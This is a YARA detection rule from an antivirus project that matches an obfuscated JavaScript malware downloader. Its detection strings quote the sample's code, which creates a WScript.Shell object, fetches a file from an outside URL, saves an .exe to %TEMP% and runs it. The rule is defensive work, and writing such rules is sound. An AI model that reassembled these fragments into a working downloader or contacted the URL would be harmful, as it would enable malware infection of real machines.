rule sig_20160328_066f700f4b2ec10d51dd7a547a22e90e {
  meta:
    description = "datamaliciousorder - file 20160328_066f700f4b2ec10d51dd7a547a22e90e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "060baad2b53e943159ec535c1d38add70d7d8487a48f32d9aa558f8a1700b113"

  strings:
    $s1  = "function Gyzgls() {return Qtmebtdje[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"0nNta4P9L.exe\";};" fullword ascii
    $s2  = "do {WScript[Opufbpk](Asxtmm() * 11)} while (Nmiywyefsv[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Nmiywyefsv[Ftiipmyd](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s4  = "function Oqoypth(Upenyfvzjk, Oxtvm){return Upenyfvzjk - Oxtvm;};" fullword ascii
    $s5  = "var Qtmebtdje = function Ebhazzoq() {return WScript[Cmehumm](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bgdxh(Lhujkses){Qtmebtdje[\"Run\"](Lhujkses, Yjbhlhq, Yjbhlhq);};" fullword ascii
    $s7  = "function Udykskj() {return ((Rkgdyzdmrd == true) && (Rkgdyzdmrd == Herzi)) ? 1 : Yjbhlhq;};" fullword ascii
    $s8  = "return Oqoypth(Tpuua, Sogusawmas);" fullword ascii
    $s9  = "function Asxtmm(){return 22;};" fullword ascii
    $s10 = "Herzi = true; " fullword ascii
    $s11 = "var Kqznv = new this[\"Date\"]();" fullword ascii
    $s12 = "function Khadpr(Elsxeiok) {var Qgmkaicr = (1, 2, 3, 4, 5, Elsxeiok); return Qgmkaicr;};" fullword ascii
    $s13 = "var Akjnqegysw = false;" fullword ascii
    $s14 = "function Azjpp()" fullword ascii
    $s15 = "var Rkgdyzdmrd = false;" fullword ascii
    $s16 = "Rkgdyzdmrd = true; " fullword ascii
    $s17 = "var Herzi = false;" fullword ascii
    $s18 = "function Qoeiboj(){return Mupxsoqgkq;};" fullword ascii
    $s19 = " while (Xmsxfkwgqk){" fullword ascii
    $s20 = "function Pwgdrb(){return Cmehumm;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}